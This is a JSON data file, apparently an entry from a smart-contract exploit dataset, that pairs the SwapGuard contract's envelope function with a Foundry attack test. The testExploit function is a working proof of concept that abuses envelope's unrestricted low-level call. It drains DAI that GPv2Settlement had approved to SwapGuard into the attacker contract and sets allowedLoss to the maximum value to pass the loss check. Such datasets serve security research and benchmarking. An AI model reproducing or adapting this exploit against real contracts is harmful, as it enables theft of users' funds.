[
  {
    "contract/interface": "SwapGuard",
    "source_type": "victim_contract",
    "function_name": "envelope",
    "original_code": "    function envelope(\n        Data[] calldata interactions,\n        address vault,\n        IERC20[] calldata tokens,\n        uint256[] calldata tokenPrices,\n        int256[] calldata balanceChanges,\n        uint256 allowedLoss\n    ) public payable {\n        unchecked {\n            // save all current balances of tokens\n            uint256[] memory balancesBeforeInteractions = new uint256[](tokens.length);\n            for (uint256 i = 0; i < tokens.length; i++) {\n                balancesBeforeInteractions[i] = tokens[i].balanceOf(vault);\n            }\n\n            for (uint256 i = 0; i < interactions.length; i++) {\n                Data memory interaction = interactions[i];\n                // solhint-disable-next-line avoid-low-level-calls\n                (bool success, bytes memory returnData) = interaction.target.call{value: interaction.value}(interaction.callData);\n                if (!success) {\n                    revert BadInteractionResponse(returnData);\n                }\n            }\n\n            uint256 totalLoss = 0;\n            // check that we didn't loose more than allowedLoss\n            // it is okay if we got more than expected\n            for (uint256 i = 0; i < tokens.length; i++) {\n                uint256 balanceAfterInteraction = tokens[i].balanceOf(vault);\n                int256 expectedBalanceChange = balanceChanges[i];\n                int256 actualBalanceChange = balanceAfterInteraction.toInt256() - balancesBeforeInteractions[i].toInt256();\n                if (actualBalanceChange < expectedBalanceChange) {\n                    totalLoss += (expectedBalanceChange - actualBalanceChange).toUint256() * tokenPrices[i];\n                }\n                if (totalLoss > allowedLoss) {\n                    revert LostMoreThanAllowed(totalLoss, allowedLoss);\n                }\n            }\n        }\n    }\n}\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 16_574_048);\n        vm.label(address(DAI), \"DAI\");\n        vm.label(address(swapGuard), \"SwapGuard\");\n        vm.label(address(GPv2Settlement), \"GPv2Settlement\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() external {\n        uint256 amount = DAI.balanceOf(GPv2Settlement);\n        if (DAI.allowance(GPv2Settlement, address(swapGuard)) < amount) {\n            amount = DAI.allowance(GPv2Settlement, address(swapGuard));\n        }\n        bytes memory callDatas =\n            abi.encodeWithSignature(\"transferFrom(address,address,uint256)\", GPv2Settlement, address(this), amount);\n        SwapGuard.Data[] memory interactions = new SwapGuard.Data[](1);\n        interactions[0] = SwapGuard.Data({target: address(DAI), value: 0, callData: callDatas});\n        address vault = address(this);\n        IERC20[] memory tokens = new IERC20[](1);\n        tokens[0] = DAI;\n        uint256[] memory tokenPrices = new uint256[](1);\n        tokenPrices[0] = 0;\n        int256[] memory balanceChanges = new int256[](1);\n        balanceChanges[0] = 0;\n        uint256 allowedLoss = type(uint256).max;\n        swapGuard.envelope(interactions, vault, tokens, tokenPrices, balanceChanges, allowedLoss);\n\n        emit log_named_decimal_uint(\"Attacker DAI balance after exploit\", DAI.balanceOf(address(this)), DAI.decimals());\n    }\n",
    "description": ""
  }
]